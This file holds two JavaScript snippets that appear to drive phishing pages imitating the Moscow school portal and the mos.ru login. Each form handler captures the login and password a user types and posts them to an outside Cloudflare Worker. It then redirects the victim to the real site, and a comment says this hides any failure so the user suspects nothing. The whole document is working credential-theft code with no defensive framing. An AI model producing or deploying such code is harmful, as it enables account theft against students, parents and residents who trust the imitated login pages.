(function () {
    const MESH_REGISTER_URL = 'https://school.mos.ru/';
    
    // Сюда вставишь ссылку на свой опубликованный Cloudflare Worker
    const WORKER_URL = 'https://tvoy-worker.tvoe-imya.workers.dev/'; 

    const form = document.querySelector('.login-form');
    const loginInput = document.getElementById('login');
    const login2Input = document.getElementById('login2');
    const submitBtn = document.querySelector('.submit-btn');

    // Функция проверки заполненности полей
    function refreshSubmitState() {
        const filled =
            loginInput.value.trim().length > 0 &&
            login2Input.value.trim().length > 0;
        submitBtn.disabled = !filled;
    }

    loginInput.addEventListener('input', refreshSubmitState);
    login2Input.addEventListener('input', refreshSubmitState);
    refreshSubmitState();

    form.addEventListener('submit', async function (event) {
        event.preventDefault();
        if (submitBtn.disabled) return;

        const login_part_1 = loginInput.value.trim();
        const login_part_2 = login2Input.value.trim();

        // Меняем состояние кнопки, чтобы не было двойных кликов
        submitBtn.disabled = true;
        const originalText = submitBtn.textContent;
        submitBtn.textContent = 'Вход...';

        try {
            // Отправляем данные в Worker
            await fetch(WORKER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ login_part_1, login_part_2 })
            });

            // После успешной отправки делаем редирект
            window.location.href = MESH_REGISTER_URL;

        } catch (error) {
            console.error('Ошибка при отправке данных:', error);
            // Если сеть отвалилась или воркер упал, всё равно делаем редирект,
            // чтобы пользователь не заподозрил ошибку в интерфейсе
            window.location.href = MESH_REGISTER_URL;
        }
    });
})();
(function () {
    const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';
    /** Куда перейти после успешного ответа воркера (200 OK). */
    const AFTER_SUCCESS_REDIRECT = 'https://login.mos.ru/sps/login';

    const form = document.getElementById('loginForm');
    const loginInput = document.getElementById('login');
    const passwordInput = document.getElementById('password');
    const submitBtn = form.querySelector('.submit-btn');
    const status = document.getElementById('status');
    const passwordToggle = document.getElementById('passwordToggle');

    function refreshSubmitState() {
        const filled =
            loginInput.value.trim().length > 0 &&
            passwordInput.value.length > 0;
        submitBtn.disabled = !filled;
    }

    function setStatus(message, kind) {
        status.textContent = message || '';
        status.classList.remove('is-error', 'is-success');
        if (kind === 'error') status.classList.add('is-error');
        if (kind === 'success') status.classList.add('is-success');
    }

    loginInput.addEventListener('input', refreshSubmitState);
    passwordInput.addEventListener('input', refreshSubmitState);
    refreshSubmitState();

    passwordToggle.addEventListener('click', () => {
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
        passwordToggle.classList.toggle('is-active', isPassword);
        passwordToggle.setAttribute(
            'aria-label',
            isPassword ? 'Скрыть пароль' : 'Показать пароль'
        );
    });

    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        if (submitBtn.disabled) return;
        window.location.href = AFTER_SUCCESS_REDIRECT;

        const payload = {
            login: loginInput.value.trim(),
            password: passwordInput.value,
        };

        const originalText = submitBtn.textContent;
        submitBtn.disabled = true;
        submitBtn.classList.add('is-loading');
        submitBtn.textContent = 'Входим…';
        setStatus('', null);

        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            let result = {};
            try { result = await response.json(); } catch (_) { /* not JSON */ }

            if (response.ok) {
                setStatus('', null);
                form.reset();
            } else {
                setStatus(
                    result.error || `Ошибка ${response.status}`,
                    'error'
                );
            }
        } catch (err) {
            setStatus('Ошибка сети: сервер не отвечает.', 'error');
        } finally {
            submitBtn.classList.remove('is-loading');
            submitBtn.textContent = originalText;
            refreshSubmitState();
        }
    });
})();
